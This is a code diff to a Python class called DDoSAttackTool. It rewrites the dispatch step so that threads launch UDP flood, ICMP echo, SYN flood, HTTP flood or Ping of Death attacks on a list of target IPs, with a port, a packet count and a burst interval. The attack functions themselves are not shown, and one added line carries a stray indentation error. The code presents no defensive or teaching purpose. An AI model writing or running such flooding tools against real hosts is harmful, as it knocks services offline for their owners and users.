@@ -71,7 +71,26 @@ class DDoSAttackTool:
         burst_interval = float(self.burst_interval_entry.get())
         attack_type = self.attack_type_entry.get()
 
-        attack_function = self.get_attack_function(attack_type)
+         if attack_type == "UDP Flood":
+            attack_thread = threading.Thread(target=self.udp_flood_attack,
+                                             args=(target_ips, port, num_packets, burst_interval))
+        elif attack_type == "ICMP Echo":
+            attack_thread = threading.Thread(target=self.icmp_echo_attack,
+                                             args=(target_ips, num_packets, burst_interval))
+        elif attack_type == "SYN Flood":
+            attack_thread = threading.Thread(target=self.syn_flood_attack,
+                                             args=(target_ips, port, num_packets, burst_interval))
+        elif attack_type == "HTTP Flood":
+            attack_thread = threading.Thread(target=self.http_flood_attack,
+                                             args=(target_ips, port, num_packets, burst_interval))
+        elif attack_type == "Ping of Death":
+            attack_thread = threading.Thread(target=self.ping_of_death_attack,
+                                             args=(target_ips, num_packets, burst_interval))
+        else:
+             print("Invalid attack type selected")
+             return
+
+        attack_thread.start()
 
         self.attack_start_time = time.time()
         self.total_bytes_sent = 0
